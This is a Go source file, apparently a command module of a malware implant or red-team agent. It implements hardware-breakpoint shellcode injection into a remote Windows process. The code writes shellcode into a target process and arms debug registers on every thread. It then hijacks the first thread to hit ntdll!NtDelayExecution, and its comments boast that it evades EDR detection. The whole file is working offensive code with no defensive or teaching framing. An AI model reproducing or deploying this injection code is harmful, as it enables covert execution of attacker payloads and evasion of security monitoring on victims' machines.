//go:build windows
// +build windows

// Hardware-breakpoint-based remote process injection.
//
// Technique: attach as debugger to the target via DebugActiveProcess, set DR0
// in every target thread to point at a frequently-called API (default
// ntdll!NtDelayExecution), wait for STATUS_SINGLE_STEP via WaitForDebugEvent,
// then SetThreadContext to redirect Rip to the shellcode buffer. Detach with
// DebugActiveProcessStop. Avoids QueueUserAPC / CreateRemoteThread /
// SetThreadContext-on-suspended-thread call patterns that EDRs flag.
//
// Constraints:
//   - x64 only (Dr0-Dr3 layout differs on x86; agent ships as amd64).
//   - Target must not already be debugged (DebugActiveProcess fails).
//   - Target must not be PPL / protected (LSASS, csrss, etc.).
//   - Assumes ntdll.dll is mapped at the same base in agent + target. True in
//     a single session because ntdll is a KnownDll, but breaks across sessions
//     and across WoW64 boundaries.

package commands

import (
	"fmt"
	"runtime"
	"strings"
	"time"
	"unsafe"
)

// Debug API procs
var (
	procDebugActiveProcess        = kernel32.NewProc("DebugActiveProcess")
	procDebugActiveProcessStop    = kernel32.NewProc("DebugActiveProcessStop")
	procDebugSetProcessKillOnExit = kernel32.NewProc("DebugSetProcessKillOnExit")
	procWaitForDebugEvent         = kernel32.NewProc("WaitForDebugEvent")
	procContinueDebugEvent        = kernel32.NewProc("ContinueDebugEvent")
)

// Debug event codes / dispositions
const (
	EXCEPTION_DEBUG_EVENT_CODE       = 1
	EXIT_PROCESS_DEBUG_EVENT_CODE    = 5
	DBG_CONTINUE                     = 0x00010002
	DBG_EXCEPTION_NOT_HANDLED uint32 = 0x80010001
)

// EXCEPTION_DEBUG_INFO matches the Windows union variant for EXCEPTION_DEBUG_EVENT.
// Layout: EXCEPTION_RECORD (152 bytes on x64) + dwFirstChance (4) + 4 padding.
type EXCEPTION_DEBUG_INFO struct {
	ExceptionRecord EXCEPTION_RECORD
	DwFirstChance   uint32
	_               uint32
}

// DEBUG_EVENT carries WaitForDebugEvent results. The union is realised here
// as the largest variant (EXCEPTION_DEBUG_INFO) — non-exception events still
// fit because their union members are smaller.
type DEBUG_EVENT struct {
	DwDebugEventCode uint32
	DwProcessId      uint32
	DwThreadId       uint32
	_                uint32 // 4-byte pad; union is 8-byte aligned because EXCEPTION_RECORD contains pointers.
	Exception        EXCEPTION_DEBUG_INFO
}

// HwbpInjectionParams describes a single HWBP-injection request.
type HwbpInjectionParams struct {
	Shellcode []byte
	PID       uint32
	// TargetAPI is "module!function" (default "ntdll!NtDelayExecution"). Only
	// ntdll resolutions are reliable across processes (KnownDlls).
	TargetAPI string
	// TimeoutMs caps how long we wait for the breakpoint to hit.
	TimeoutMs uint32
}

// resolveAPIFromTarget parses a "module!function" string and returns the
// in-process address. Caller is responsible for confirming that the address
// will be valid in the target (true for ntdll, false for arbitrary modules).
func resolveAPIFromTarget(target string) (uintptr, string, error) {
	if target == "" {
		target = "ntdll!NtDelayExecution"
	}
	parts := strings.SplitN(target, "!", 2)
	if len(parts) != 2 || parts[0] == "" || parts[1] == "" {
		return 0, "", fmt.Errorf("invalid target API %q (expected module!function)", target)
	}
	module := parts[0]
	if !strings.HasSuffix(strings.ToLower(module), ".dll") {
		module += ".dll"
	}
	funcName := parts[1]
	addr, err := resolveFunctionAddress(module, funcName)
	if err != nil {
		return 0, "", err
	}
	return addr, fmt.Sprintf("%s!%s", strings.TrimSuffix(strings.ToLower(module), ".dll"), funcName), nil
}

// enumerateProcessThreads returns every TID owned by the target PID. Walks a
// CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD) snapshot once; safe to call
// repeatedly because the snapshot is closed before return.
func enumerateProcessThreads(targetPID uint32) ([]uint32, error) {
	snapshot, _, err := procCreateToolhelp32Snapshot.Call(uintptr(TH32CS_SNAPTHREAD), 0)
	if snapshot == uintptr(^uintptr(0)) {
		return nil, fmt.Errorf("CreateToolhelp32Snapshot failed: %w", err)
	}
	defer procCloseHandle.Call(snapshot)

	var entry THREADENTRY32
	entry.Size = uint32(unsafe.Sizeof(entry))

	ret, _, err := procThread32First.Call(snapshot, uintptr(unsafe.Pointer(&entry)))
	if ret == 0 {
		return nil, fmt.Errorf("Thread32First failed: %w", err)
	}

	var tids []uint32
	for {
		if entry.OwnerProcessID == targetPID {
			tids = append(tids, entry.ThreadID)
		}
		entry.Size = uint32(unsafe.Sizeof(entry))
		ret, _, _ = procThread32Next.Call(snapshot, uintptr(unsafe.Pointer(&entry)))
		if ret == 0 {
			break
		}
	}
	return tids, nil
}

// armThreadsWithBreakpoint sets DR0 = apiAddr (execution breakpoint, 1 byte)
// on every thread in tids. Returns the count successfully patched.
func armThreadsWithBreakpoint(tids []uint32, apiAddr uintptr) (int, []string) {
	const dr7Enable = uint64(0x1) // local-enable Dr0, condition=execution, length=1 byte
	patched := 0
	var diags []string
	for _, tid := range tids {
		hThread, err := injectOpenThread(THREAD_SET_CONTEXT|THREAD_GET_CONTEXT|THREAD_SUSPEND_RESUME, tid)
		if err != nil {
			diags = append(diags, fmt.Sprintf("OpenThread(tid=%d) failed: %v", tid, err))
			continue
		}
		if err := setThreadDebugRegisters(hThread, uint64(apiAddr), 0, dr7Enable); err != nil {
			diags = append(diags, fmt.Sprintf("setThreadDebugRegisters(tid=%d) failed: %v", tid, err))
			injectCloseHandle(hThread)
			continue
		}
		injectCloseHandle(hThread)
		patched++
	}
	return patched, diags
}

// disarmThreadsBreakpoint clears DR0/DR7 on every thread in tids. Best-effort —
// silently swallows individual failures since the breakpoint has already
// served its purpose by the time we call this.
func disarmThreadsBreakpoint(tids []uint32) {
	for _, tid := range tids {
		hThread, err := injectOpenThread(THREAD_SET_CONTEXT|THREAD_GET_CONTEXT|THREAD_SUSPEND_RESUME, tid)
		if err != nil {
			continue
		}
		_ = setThreadDebugRegisters(hThread, 0, 0, 0)
		injectCloseHandle(hThread)
	}
}

// hwbpInjectShellcode performs a full HWBP-based injection into pid.
// Returns a human-readable trace and an error if the injection did not
// successfully redirect a target thread.
func hwbpInjectShellcode(params HwbpInjectionParams) (string, error) {
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("HWBP injection requires Windows")
	}
	if len(params.Shellcode) == 0 {
		return "", fmt.Errorf("shellcode is empty")
	}
	if params.PID == 0 || params.PID == 4 {
		return "", fmt.Errorf("invalid target PID %d (cannot debug System / Idle)", params.PID)
	}
	currentPID, _, _ := procGetCurrentProcessId.Call()
	if uintptr(params.PID) == currentPID {
		return "", fmt.Errorf("HWBP injection cannot target the current process (PID %d)", params.PID)
	}
	if params.TimeoutMs == 0 {
		params.TimeoutMs = 30000
	}

	var sb strings.Builder
	start := time.Now()

	// Step 1: resolve breakpoint API address (via our own ntdll, valid in target via KnownDlls).
	apiAddr, apiLabel, err := resolveAPIFromTarget(params.TargetAPI)
	if err != nil {
		return "", err
	}
	sb.WriteString(fmt.Sprintf("[*] HWBP injection target: %s @ 0x%X\n", apiLabel, apiAddr))
	sb.WriteString(fmt.Sprintf("[*] Target PID: %d, shellcode size: %d, timeout: %dms\n",
		params.PID, len(params.Shellcode), params.TimeoutMs))

	// Step 2: open target.
	desiredAccess := uint32(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)
	hProcess, err := injectOpenProcess(desiredAccess, params.PID)
	if err != nil {
		return sb.String(), fmt.Errorf("OpenProcess(pid=%d): %w", params.PID, err)
	}
	defer injectCloseHandle(hProcess)
	sb.WriteString(fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess))

	// Step 3: write shellcode RW → RX.
	shellcodeAddr, err := injectAllocWriteProtect(hProcess, params.Shellcode, PAGE_EXECUTE_READ)
	if err != nil {
		return sb.String(), fmt.Errorf("shellcode allocation: %w", err)
	}
	sb.WriteString(fmt.Sprintf("[+] Shellcode written to 0x%X (RX, %d bytes)\n", shellcodeAddr, len(params.Shellcode)))

	// Step 4: attach as debugger.
	ret, _, dbgErr := procDebugActiveProcess.Call(uintptr(params.PID))
	if ret == 0 {
		return sb.String(), fmt.Errorf("DebugActiveProcess(pid=%d): %w", params.PID, dbgErr)
	}
	sb.WriteString("[+] Attached as debugger via DebugActiveProcess\n")

	// Ensure the target survives our exit.
	if r, _, _ := procDebugSetProcessKillOnExit.Call(0); r == 0 {
		sb.WriteString("[!] DebugSetProcessKillOnExit(false) failed (target may die if agent exits before detach)\n")
	}

	// Always detach on return.
	detached := false
	defer func() {
		if !detached {
			procDebugActiveProcessStop.Call(uintptr(params.PID))
		}
	}()

	// Step 5: enumerate target's threads + arm them.
	tids, err := enumerateProcessThreads(params.PID)
	if err != nil {
		return sb.String(), fmt.Errorf("enumerate threads: %w", err)
	}
	if len(tids) == 0 {
		return sb.String(), fmt.Errorf("no threads in target PID %d", params.PID)
	}
	sb.WriteString(fmt.Sprintf("[*] Enumerated %d threads in target\n", len(tids)))

	armed, armDiags := armThreadsWithBreakpoint(tids, apiAddr)
	for _, d := range armDiags {
		sb.WriteString("[-] " + d + "\n")
	}
	if armed == 0 {
		return sb.String(), fmt.Errorf("could not arm any thread with HWBP")
	}
	sb.WriteString(fmt.Sprintf("[+] Armed %d/%d threads with DR0 = 0x%X\n", armed, len(tids), apiAddr))

	// Step 6: debug event loop.
	var (
		event           DEBUG_EVENT
		breakpointHits  int
		otherEvents     int
		redirectedTID   uint32
	)
	// Diagnostic trace: full event log capped to first 60 events, per-code counts always tracked.
	const maxTraceEvents = 60
	tracedEvents := 0
	codeCounts := map[uint32]int{}
	addrSamples := map[uint32]uintptr{} // first observed address per exception code
	deadline := time.Now().Add(time.Duration(params.TimeoutMs) * time.Millisecond)

	for time.Now().Before(deadline) {
		remaining := time.Until(deadline) / time.Millisecond
		if remaining <= 0 {
			break
		}
		ret, _, _ := procWaitForDebugEvent.Call(uintptr(unsafe.Pointer(&event)), uintptr(remaining))
		if ret == 0 {
			// Timeout in this poll — fall through to deadline check.
			continue
		}

		switch event.DwDebugEventCode {
		case EXCEPTION_DEBUG_EVENT_CODE:
			er := event.Exception.ExceptionRecord
			codeCounts[er.ExceptionCode]++
			if _, ok := addrSamples[er.ExceptionCode]; !ok {
				addrSamples[er.ExceptionCode] = uintptr(er.ExceptionAddress)
			}
			if tracedEvents < maxTraceEvents {
				delta := int64(uintptr(er.ExceptionAddress)) - int64(apiAddr)
				sb.WriteString(fmt.Sprintf("[debug] event#%d: code=0x%X addr=0x%X (apiAddr=0x%X, delta=%+d) firstChance=%d tid=%d\n",
					tracedEvents, er.ExceptionCode, uintptr(er.ExceptionAddress), apiAddr, delta,
					event.Exception.DwFirstChance, event.DwThreadId))
				tracedEvents++
			}
			if er.ExceptionCode == STATUS_SINGLE_STEP && uintptr(er.ExceptionAddress) == apiAddr {
				breakpointHits++
				if redirectedTID == 0 {
					if err := redirectThreadRip(event.DwThreadId, shellcodeAddr); err != nil {
						sb.WriteString(fmt.Sprintf("[-] Failed to redirect tid=%d: %v\n", event.DwThreadId, err))
						procContinueDebugEvent.Call(uintptr(event.DwProcessId),
							uintptr(event.DwThreadId), uintptr(DBG_EXCEPTION_NOT_HANDLED))
						continue
					}
					redirectedTID = event.DwThreadId
					sb.WriteString(fmt.Sprintf("[+] Redirected thread %d Rip → 0x%X (shellcode)\n",
						event.DwThreadId, shellcodeAddr))
					procContinueDebugEvent.Call(uintptr(event.DwProcessId),
						uintptr(event.DwThreadId), uintptr(DBG_CONTINUE))
					// Disarm everyone else so we don't redirect a second thread into the same shellcode.
					disarmThreadsBreakpoint(tids)
					goto done
				}
				// Another thread also hit the breakpoint before disarm propagated;
				// pass it through so the target keeps running normally.
				procContinueDebugEvent.Call(uintptr(event.DwProcessId),
					uintptr(event.DwThreadId), uintptr(DBG_EXCEPTION_NOT_HANDLED))
			} else {
				otherEvents++
				procContinueDebugEvent.Call(uintptr(event.DwProcessId),
					uintptr(event.DwThreadId), uintptr(DBG_EXCEPTION_NOT_HANDLED))
			}
		case EXIT_PROCESS_DEBUG_EVENT_CODE:
			procContinueDebugEvent.Call(uintptr(event.DwProcessId),
				uintptr(event.DwThreadId), uintptr(DBG_CONTINUE))
			return sb.String(), fmt.Errorf("target process exited before breakpoint hit")
		default:
			otherEvents++
			if tracedEvents < maxTraceEvents {
				sb.WriteString(fmt.Sprintf("[debug] event#%d: non-exception code=%d tid=%d\n",
					tracedEvents, event.DwDebugEventCode, event.DwThreadId))
				tracedEvents++
			}
			procContinueDebugEvent.Call(uintptr(event.DwProcessId),
				uintptr(event.DwThreadId), uintptr(DBG_CONTINUE))
		}
	}

done:
	// Step 7: detach.
	if r, _, e := procDebugActiveProcessStop.Call(uintptr(params.PID)); r == 0 {
		sb.WriteString(fmt.Sprintf("[!] DebugActiveProcessStop failed: %v\n", e))
	} else {
		detached = true
		sb.WriteString("[+] Detached debugger via DebugActiveProcessStop\n")
	}

	elapsedMs := time.Since(start).Milliseconds()
	sb.WriteString(fmt.Sprintf("[*] Breakpoint hits: %d, other debug events: %d, elapsed: %dms\n",
		breakpointHits, otherEvents, elapsedMs))
	if len(codeCounts) > 0 {
		sb.WriteString("[*] Exception code distribution:\n")
		for code, n := range codeCounts {
			sb.WriteString(fmt.Sprintf("    code=0x%08X count=%d firstAddr=0x%X\n", code, n, addrSamples[code]))
		}
	}

	if redirectedTID == 0 {
		// Best-effort cleanup: clear DR0/DR7 on threads even though we never hit.
		disarmThreadsBreakpoint(tids)
		return sb.String(), fmt.Errorf("breakpoint never fired within %dms (target may not be calling %s)",
			params.TimeoutMs, apiLabel)
	}
	sb.WriteString("[+] HWBP injection completed successfully\n")
	return sb.String(), nil
}

// redirectThreadRip rewrites a target thread's Rip to point at the shellcode
// address, and clears its DR0/DR7 so the breakpoint does not retrigger when
// execution returns from the shellcode (or if the shellcode loops back through
// the API). The thread is left running.
func redirectThreadRip(tid uint32, shellcodeAddr uintptr) error {
	hThread, err := injectOpenThread(THREAD_SET_CONTEXT|THREAD_GET_CONTEXT|THREAD_SUSPEND_RESUME, tid)
	if err != nil {
		return fmt.Errorf("OpenThread(tid=%d): %w", tid, err)
	}
	defer injectCloseHandle(hThread)

	// Suspend so the context read/write race is closed.
	if r, _, e := procSuspendThread.Call(hThread); int32(r) == -1 {
		return fmt.Errorf("SuspendThread(tid=%d): %w", tid, e)
	}

	var ctx CONTEXT_AMD64
	ctx.ContextFlags = CONTEXT_ALL_FLAGS
	if err := injectGetThreadContext(hThread, &ctx); err != nil {
		procResumeThread.Call(hThread)
		return err
	}

	ctx.Rip = uint64(shellcodeAddr)
	ctx.Dr0 = 0
	ctx.Dr1 = 0
	ctx.Dr6 = 0
	ctx.Dr7 = 0
	ctx.ContextFlags = CONTEXT_ALL_FLAGS

	if err := injectSetThreadContext(hThread, &ctx); err != nil {
		procResumeThread.Call(hThread)
		return err
	}

	procResumeThread.Call(hThread)
	return nil
}

